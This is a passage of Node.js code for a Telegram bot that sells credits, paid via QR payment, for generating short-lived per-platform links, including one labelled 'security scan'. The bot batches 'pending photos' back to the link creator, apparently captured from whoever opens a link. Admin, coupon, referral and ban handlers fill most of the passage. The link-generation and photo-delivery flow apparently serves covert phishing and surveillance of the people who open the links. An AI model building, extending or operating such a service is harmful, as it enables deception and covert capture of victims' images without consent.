    await S7.sendMessage(referrerId, '🎉 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> +2\n\n📊 <b>Your Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
    await S7.sendMessage(config.adminId, '👥 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ' + referrerInfo + '\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n🆔 <b>New User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> 2\n\n📊 <b>Referrer Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
    await S7.sendMessage(userId, '✅ <b>Welcome!</b>\n\nYou joined through <b>' + referrerInfo + '</b>\'s referral link!\n🎁 You already have 3 credits to start.\n⭐ <b>Your Credits:</b> ' + user.credits, { parse_mode: 'HTML' });
    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
    logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
}

// ====================== CALLBACK QUERY HANDLER ======================
S7.on('callback_query', async (q) => {
    const uid = q.from.id;
    const mid = q.message.message_id;
    const cid = q.message.chat.id;
    const isAdmin = uid.toString() === config.adminId;
    console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);

    if (await isUserBanned(uid) && q.data !== 'admin_panel' && q.data !== 'admin_stats' && q.data !== 'admin_broadcast' && q.data !== 'admin_logs') {
        await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
        return;
    }

    // Admin panel
    if (q.data === 'admin_panel' && isAdmin) {
        await S7.deleteMessage(cid, mid);
        await S7.sendMessage(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below.', { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
        return;
    }
    if (q.data === 'admin_stats' && isAdmin) {
        const users = await User.find();
        const photos = await getPhotos();
        const channels = await getChannels();
        const referrals = await Referral.find();
        const links = await Link.find();
        await S7.sendMessage(cid, '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + users.length + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n🔗 Total Links: ' + links.length + '\n⏱ Uptime: ' + getUptime(), { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }
    if (q.data === 'admin_broadcast' && isAdmin) {
        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nType your message: /broadcast [message]', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }
    if (q.data === 'admin_logs' && isAdmin) {
        try {
            const logs = fs.readFileSync(path.join(DATA_DIR, 'logs.txt'), 'utf8');
            const lastLogs = logs.split('\n').slice(-50).join('\n');
            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
        } catch { await S7.sendMessage(cid, 'No logs', { reply_markup: SYBack }); }
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Check all channels
    if (q.data === 'check_all') {
        const isMember = await checkAllChannels(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            const user = await getUser(uid);
            if (user._pendingReferrer) {
                const referrerId = user._pendingReferrer;
                user._pendingReferrer = null;
                await user.save();
                await processReferral(referrerId, uid);
                return;
            }
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, { text: '❌ Please join ALL channels first!', show_alert: true });
        }
        return;
    }

    // Referral
    if (q.data === 'referral') {
        const botInfo = await S7.getMe();
        const referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
        await S7.sendMessage(cid, '👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get 3 credits on start!', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Credits
    if (q.data === 'credits') {
        const user = await getUser(uid);
        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
        await S7.sendMessage(cid, '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened 3 times only', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Buy credits
    if (q.data === 'buy_credits') {
        const plans = {
            inline_keyboard: [
                [{ text: '💰 10 Credits - ₹20', callback_data: 'plan_10' }],
                [{ text: '💰 25 Credits - ₹40', callback_data: 'plan_25' }],
                [{ text: '💰 50 Credits - ₹70', callback_data: 'plan_50' }],
                [{ text: '♾️ Unlimited - ₹100', callback_data: 'plan_unlimited' }],
                [{ text: '🔙 BACK', callback_data: 'back' }]
            ]
        };
        await S7.sendMessage(cid, '💳 <b>Buy Credits</b>\n\nChoose a plan below:', { parse_mode: 'HTML', reply_markup: plans });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Plan selection
    if (q.data.startsWith('plan_')) {
        const plan = q.data.replace('plan_', '');
        let credits, amount;
        if (plan === '10') { credits = 10; amount = 20; }
        else if (plan === '25') { credits = 25; amount = 40; }
        else if (plan === '50') { credits = 50; amount = 70; }
        else if (plan === 'unlimited') { credits = 'Unlimited'; amount = 100; }
        else return;

        const msg = '💰 <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ' + credits + '\n💵 <b>Amount:</b> ₹' + amount + '\n🆔 <b>Transaction ID:</b> PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹' + amount + '\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.';
        await S7.sendMessage(cid, msg, { parse_mode: 'HTML' });
        
        if (qrExists()) {
            await S7.sendPhoto(cid, QR_FILE, { caption: '💳 <b>Scan QR to Pay ₹' + amount + '</b>', parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(cid, '⚠️ <b>QR code not uploaded yet.</b>\nPlease wait for admin to upload payment QR.\n\nUse /addqr to upload QR (Admin only).', { parse_mode: 'HTML' });
        }
        const user = await getUser(uid);
        user._pendingPayment = { credits, amount, plan };
        await user.save();
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Payment accept/reject
    if (q.data.startsWith('pay_accept_') && isAdmin) {
        const userId = q.data.replace('pay_accept_', '');
        const user = await getUser(userId);
        const payment = user._pendingPayment;
        if (!payment) {
            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
            return;
        }
        if (payment.credits === 'Unlimited') {
            user.unlimited = true;
            await user.save();
            await S7.sendMessage(userId,
                '🎉 <b>UNLIMITED ACTIVATED!</b>\n\n' +
                'Your payment of ₹' + payment.amount + ' has been verified.\n' +
                'You now have <b>Unlimited Credits</b> forever!\n\n' +
                'Thank you for your support! 🙏',
                { parse_mode: 'HTML' }
            );
        } else {
            user.credits = (user.credits || 0) + parseInt(payment.credits);
            await user.save();
            await S7.sendMessage(userId,
                '✅ <b>Payment Verified!</b>\n\n' +
                '💰 Amount: ₹' + payment.amount + '\n' +
                '⭐ Credits Added: +' + payment.credits + '\n' +
                '📊 Total Credits: ' + user.credits + '\n\n' +
                'Thank you for your support! 🙏',
                { parse_mode: 'HTML' }
            );
        }
        user._pendingPayment = null;
        await user.save();

        await S7.editMessageText(
            '✅ <b>Payment Accepted!</b>\n\n' +
            '👤 User: <code>' + userId + '</code>\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            '✅ Credits added successfully!',
            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
        );

        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted! Credits added.' });
        logToFile('💰 Admin accepted payment from ' + userId);
        return;
    }

    if (q.data.startsWith('pay_reject_') && isAdmin) {
        const userId = q.data.replace('pay_reject_', '');
        const user = await getUser(userId);
        const payment = user._pendingPayment;
        if (!payment) {
            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
            return;
        }
        await S7.sendMessage(userId,
            '❌ <b>Payment Rejected!</b>\n\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            'Reason: Payment verification failed.\n' +
            'Please try again with a valid screenshot.',
            { parse_mode: 'HTML' }
        );
        user._pendingPayment = null;
        await user.save();

        await S7.editMessageText(
            '❌ <b>Payment Rejected!</b>\n\n' +
            '👤 User: <code>' + userId + '</code>\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            '❌ User notified.',
            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
        );

        await S7.answerCallbackQuery(q.id, { text: '❌ Payment rejected.' });
        logToFile('💰 Admin rejected payment from ' + userId);
        return;
    }

    if (q.data.startsWith('pay_dm_') && isAdmin) {
        const userId = q.data.replace('pay_dm_', '');
        await S7.sendMessage(cid,
            '💬 <b>Send message to user</b>\n\n' +
            'Reply with: <code>/dm ' + userId + ' [message]</code>\n\n' +
            'Example: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>',
            { parse_mode: 'HTML' }
        );
        await S7.answerCallbackQuery(q.id, { text: '💬 Type /dm ' + userId + ' [message]' });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Generate links
    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
        const isGen = q.data.startsWith('gen_');
        const platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
        const platformKey = platform === 'securityscan' ? 'securityScan' : platform;

        const user = await getUser(uid);
        if (user.banned) {
            await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
            return;
        }
        if (!user.unlimited && (user.credits || 0) <= 0) {
            await S7.answerCallbackQuery(q.id, { text: '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.', show_alert: true });
            return;
        }
        const deducted = await useCredit(uid);
        if (!deducted) {
            await S7.answerCallbackQuery(q.id, { text: '❌ Credit deduction failed. Please try again.', show_alert: true });
            return;
        }

        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'), { parse_mode: 'HTML', reply_markup: SYBack });
        try {
            const response = await fetch(config.baseUrl + '/api/create-link', {
                method: 'GET',
                headers: { userid: String(uid), platform: platformKey }
            });
            const data = await response.json();
            if (data.error && data.needBuy) {
                await addCredits(uid, 1);
                await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nClick "Buy Credits" to purchase.'), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
                return;
            }
            const platformDisplay = platform === 'securityscan' ? 'SECURITY SCAN' : platform.toUpperCase();
            const finalMsg = '✅ <b>' + platformDisplay + ' Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> 3 times\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
            await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) });
        } catch (err) {
            console.error('Link Error:', err.message);
            logToFile('❌ Link Error: ' + err.message);
            await addCredits(uid, 1);
            await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ Error generating link'), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
        }
        return;
    }

    if (q.data === 'back') {
        await S7.deleteMessage(cid, mid);
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== PAYMENT SCREENSHOT ======================
S7.on('message', async (msg) => {
    if (!msg.photo) return;
    const user = await getUser(msg.from.id);
    if (user.banned) return;
    if (!user._pendingPayment) return;
    const payment = user._pendingPayment;
    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Credits:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
    const adminButtons = { inline_keyboard: [[{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id }], [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id }], [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id }]] };
    await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
    await S7.sendMessage(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.', { parse_mode: 'HTML' });
    logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
    // Do NOT clear _pendingPayment here; clear only after admin action.
});

// ====================== COMMAND HANDLERS (ALL MISSING COMMANDS ADDED) ======================

// Helper: only admin
const adminOnly = (msg) => msg.from.id.toString() === config.adminId;

S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    const args = text.split(' ');
    const cmd = args[0].toLowerCase();

    // /help - show all commands
    if (cmd === '/help' || cmd === '/commands') {
        const helpText = `📜 <b>Available Commands</b>

👤 <b>User Commands:</b>
/start - Start the bot
/menu - Show main menu
/pay [amount] - Buy credits (e.g., /pay 50)
/credits - Check your credits
/referral - Get referral link
/redeem [coupon_code] - Redeem coupon

👑 <b>Admin Commands:</b>
/addcredits [userId] [amount] - Add credits
/removecredits [userId] [amount] - Remove credits
/unlimited [userId] - Toggle unlimited
/resetuser [userId] - Reset user data
/users - List all users
/stats - Bot statistics
/broadcast [message] - Send to all users
/addqr - Upload QR code (send photo after command)
/removeqr - Remove QR code
/viewqr - View QR code
/addchannel [id] [name] [link] - Add channel
/removechannel [id] - Remove channel
/channels - List all channels
/addphoto [caption] - Upload photo (reply with image)
/featured [photoId] - Set featured photo
/featuredmsg [message] - Set featured message
/featuredtoggle - Toggle featured on/off
/logs - Show recent logs
/restart - Restart bot
/dm [userId] [message] - DM a user
/ban [userId or @username] - Ban user
/unban [userId or @username] - Unban user
/createcoupon [code] [credits] [maxUses] - Create coupon
/coupons - List all coupons
/deletecoupon [code] - Delete coupon`;
        await S7.sendMessage(msg.chat.id, helpText, { parse_mode: 'HTML' });
        return;
    }

    // All admin-only commands below
    if (!adminOnly(msg)) return;

    // /addcredits
    if (cmd === '/addcredits' && args.length === 3) {
        const userId = args[1];
        const amount = parseInt(args[2]);
        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
        try {
            const user = await getUser(userId);
            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot add credits.');
            user.credits += amount;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}. New balance: ${user.credits}`);
            logToFile(`Admin added ${amount} credits to ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /removecredits
    if (cmd === '/removecredits' && args.length === 3) {
        const userId = args[1];
        const amount = parseInt(args[2]);
        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
        try {
            const user = await getUser(userId);
            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot remove credits.');
            user.credits = Math.max(0, user.credits - amount);
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}. New balance: ${user.credits}`);
            logToFile(`Admin removed ${amount} credits from ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /unlimited
    if (cmd === '/unlimited' && args.length === 2) {
        const userId = args[1];
        try {
            const user = await getUser(userId);
            user.unlimited = !user.unlimited;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Unlimited toggled ${user.unlimited ? 'ON' : 'OFF'} for user ${userId}`);
            logToFile(`Admin toggled unlimited for ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /resetuser
    if (cmd === '/resetuser' && args.length === 2) {
        const userId = args[1];
        try {
            const user = await getUser(userId);
            user.credits = 3;
            user.referrals = 0;
            user.totalReferrals = 0;
            user.unlimited = false;
            user.referredBy = null;
            user.banned = false;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset to default.`);
            logToFile(`Admin reset user ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /users
    if (cmd === '/users') {
        try {
            const users = await User.find();
            let list = '👥 <b>All Users</b>\n\n';
            for (const u of users) {
                list += `🆔 ${u.userId} | Credits: ${u.unlimited ? '♾️' : u.credits} | Ref: ${u.totalReferrals} | ${u.banned ? '🚫' : '✅'}\n`;
                if (list.length > 3800) {
                    await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
                    list = '';
                }
            }
            if (list) await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /stats
    if (cmd === '/stats') {
        try {
            const users = await User.find();
            const photos = await getPhotos();
            const channels = await getChannels();
            const referrals = await Referral.find();
            const links = await Link.find();
            const coupons = await getCoupons();
            const stats = `📊 <b>Bot Statistics</b>\n\n👥 Users: ${users.length}\n📷 Photos: ${photos.length}\n📢 Channels: ${channels.length}\n👥 Referrals: ${referrals.length}\n🔗 Links: ${links.length}\n🎫 Coupons: ${coupons.length}\n⏱ Uptime: ${getUptime()}`;
            await S7.sendMessage(msg.chat.id, stats, { parse_mode: 'HTML' });
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /broadcast
    if (cmd === '/broadcast') {
        const message = args.slice(1).join(' ');
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
        try {
            const users = await User.find();
            let sent = 0;
            for (const u of users) {
                try {
                    await S7.sendMessage(u.userId, '📢 <b>Broadcast Message</b>\n\n' + message, { parse_mode: 'HTML' });
                    sent++;
                } catch (e) {}
                if (sent % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            await S7.sendMessage(msg.chat.id, `✅ Broadcast sent to ${sent} users.`);
            logToFile(`Admin broadcast: ${message}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /addqr
    if (cmd === '/addqr') {
        const user = await getUser(msg.from.id);
        user._waitingForQR = true;
        await user.save();
        await S7.sendMessage(msg.chat.id, '📤 Please send the QR code image (photo or document).');
        return;
    }

    // /removeqr
    if (cmd === '/removeqr') {
        const removed = deleteQRFile();
        if (removed) await S7.sendMessage(msg.chat.id, '✅ QR code removed.');
        else await S7.sendMessage(msg.chat.id, '❌ No QR code found.');
        return;
    }

    // /viewqr
    if (cmd === '/viewqr') {
        if (qrExists()) {
            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: '💳 Current QR Code' });
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet.');
        }
        return;
    }

    // /addchannel
    if (cmd === '/addchannel' && args.length === 4) {
        const id = args[1];
        const name = args[2];
        const link = args[3];
        try {
            await addChannel(id, name, link);
            await S7.sendMessage(msg.chat.id, `✅ Channel "${name}" added.`);
            logToFile(`Admin added channel ${id}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /removechannel
    if (cmd === '/removechannel' && args.length === 2) {
        const id = args[1];
        try {
            await removeChannel(id);
            await S7.sendMessage(msg.chat.id, `✅ Channel ${id} removed.`);
            logToFile(`Admin removed channel ${id}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /channels
    if (cmd === '/channels') {
        const channels = await getChannels();
        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels.');
        let list = '📢 <b>Channels</b>\n\n';
        channels.forEach(c => { list += `• ${c.name} (${c.id}) - ${c.link}\n`; });
        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
        return;
    }

    // /addphoto
    if (cmd === '/addphoto') {
        // User must reply with a photo or document image.
        const user = await getUser(msg.from.id);
        user._waitingForPhoto = true;
        await user.save();
        await S7.sendMessage(msg.chat.id, '📸 Please send the photo (or document image) you want to add. Include caption in the message.');
        return;
    }

    // /featured
    if (cmd === '/featured' && args.length === 2) {
        const photoId = args[1];
        try {
            await setFeaturedPhoto(photoId);
            await S7.sendMessage(msg.chat.id, `✅ Featured photo set to ${photoId}.`);
            logToFile(`Admin set featured photo ${photoId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /featuredmsg
    if (cmd === '/featuredmsg') {
        const message = args.slice(1).join(' ');
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /featuredmsg [message]');
        try {
            await setFeaturedMessage(message);
            await S7.sendMessage(msg.chat.id, '✅ Featured message updated.');
            logToFile(`Admin set featured message: ${message}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /featuredtoggle
    if (cmd === '/featuredtoggle') {
        try {
            const featured = await toggleFeaturedStatus();
            await S7.sendMessage(msg.chat.id, `✅ Featured ${featured.status ? 'activated' : 'deactivated'}.`);
            logToFile(`Admin toggled featured to ${featured.status}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /logs
    if (cmd === '/logs') {
        try {
            const logPath = path.join(DATA_DIR, 'logs.txt');
            if (fs.existsSync(logPath)) {
                const logs = fs.readFileSync(logPath, 'utf8');
                const lastLogs = logs.split('\n').slice(-50).join('\n');
                await S7.sendMessage(msg.chat.id, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML' });
            } else {
                await S7.sendMessage(msg.chat.id, 'No logs.');
            }
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /restart
    if (cmd === '/restart') {
        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
        logToFile('Admin restarted bot');
        process.exit(0);
        return;
    }

    // /dm - already handled separately, but keep for completeness
    if (cmd === '/dm' && args.length >= 3) {
        const userId = args[1];
        const message = args.slice(2).join(' ');
        try {
            await S7.sendMessage(userId, '💬 <b>Message from Admin</b>\n\n' + message, { parse_mode: 'HTML' });
            await S7.sendMessage(msg.chat.id, `✅ Message sent to ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /ban, /unban, /createcoupon, /coupons, /deletecoupon, /redeem are already defined earlier.
    // We'll add them here again just in case, but they are already present.
    // Actually they are defined outside this block, but let's ensure they are not duplicated.
});

// Existing admin commands (ban, unban, coupon) - these are already defined but we keep them.
// To avoid duplication, we'll define them above or keep them as separate handlers.
// Since they are already defined earlier in the code (before the big command block),
// we don't need to redefine them. They are in the earlier S7.on('message') blocks.
// We'll just keep those.

// ====================== HANDLER FOR /ADD PHOTO (reply) ======================
S7.on('message', async (msg) => {
    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
    const user = await getUser(msg.from.id);
    if (!user._waitingForPhoto) return;
    if (!adminOnly(msg)) return;

    try {
        let fileId;
        let caption = msg.caption || '';
        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
        else fileId = msg.document.file_id;

        const fileLink = await S7.getFileLink(fileId);
        const response = await fetch(fileLink);
        const buffer = await response.buffer();

        // Save to filesystem
        const filename = Date.now() + '-' + (msg.document ? msg.document.file_name : 'photo.jpg');
        const filePath = path.join(BOT_PHOTO_DIR, filename);
        fs.writeFileSync(filePath, buffer);

        // Add to DB
        const photo = await addPhoto({ filename, originalname: filename, path: filePath }, caption);
        await S7.sendMessage(msg.chat.id, `✅ Photo uploaded: ${photo.id}`);
        user._waitingForPhoto = false;
        await user.save();
        logToFile(`Admin uploaded photo ${photo.id}`);
    } catch (err) {
        S7.sendMessage(msg.chat.id, '❌ Error uploading photo: ' + err.message);
    }
});

// ====================== QR PHOTO HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
    const user = await getUser(msg.from.id);
    if (!user._waitingForQR) return;
    if (!adminOnly(msg)) return;

    try {
        let fileId;
        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
        else fileId = msg.document.file_id;

        const fileLink = await S7.getFileLink(fileId);
        const response = await fetch(fileLink);
        const buffer = await response.buffer();
        saveQRBuffer(buffer);
        user._waitingForQR = false;
        await user.save();
        await S7.sendMessage(msg.chat.id, '✅ QR code saved successfully.');
        logToFile('QR uploaded via bot');
    } catch (err) {
        S7.sendMessage(msg.chat.id, '❌ Error saving QR: ' + err.message);
    }
});

// ====================== REDEEM COUPON (USER COMMAND) ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/redeem ')) {
        const code = text.replace('/redeem ', '').trim();
        const userId = msg.from.id;
        const user = await getUser(userId);
        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
        const result = await redeemCoupon(userId, code);
        if (result.error) {
            await S7.sendMessage(userId, '❌ ' + result.error);
        } else {
            await S7.sendMessage(userId, '✅ Coupon redeemed! +' + result.credits + ' credits added.\n⭐ Total Credits: ' + (await getUser(userId)).credits);
            logToFile('🎫 User ' + userId + ' redeemed coupon ' + code);
        }
        return;
    }
});

// ====================== BACKGROUND PROCESSES ======================
setInterval(() => {
    const userIds = Object.keys(pendingPhotos);
    const now = Date.now();
    for (const userId of userIds) {
        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
            const lastActive = userActive[userId] || 0;
            if ((now - lastActive) > 2000 || pendingPhotos[userId].length >= 20) {
                sendBatchPhotos(userId);
            }
        }
    }
}, 2000);

setInterval(async () => {
    const links = await Link.find({ active: true });
    for (const link of links) {
        if (Date.now() > link.expiresAt || link.opens >= link.maxOpens) {
            link.active = false;
            await link.save();
        }
    }
}, 60000);

// ====================== START SERVER ======================
app.listen(config.port, () => {
    console.log('✅ Server running on port ' + config.port);
    console.log('📌 Admin Panel: http://localhost:' + config.port + '/admin');
    console.log('📌 Base URL: ' + config.baseUrl);
    console.log('🤖 Bot is ready! Send /start to begin.');
    console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
    console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
    console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT FIXED!');
    console.log('⏰ Links expire in 15 minutes, max 3 opens');
    console.log('💳 Each link generation uses 1 credit');
    console.log('📦 Important data in MongoDB, QR in file system');
    console.log('🎫 Coupon system active');
    console.log('🚫 Ban/Unban system active');
    console.log('📜 All commands implemented!');
});

process.on('uncaughtException', err => {
    console.error('❌ Uncaught Exception:', err.message);
    logToFile('❌ Uncaught Exception: ' + err.message);
});
process.on('unhandledRejection', reason => {
    console.error('❌ Unhandled Rejection:', reason);
    logToFile('❌ Unhandled Rejection: ' + reason);
});
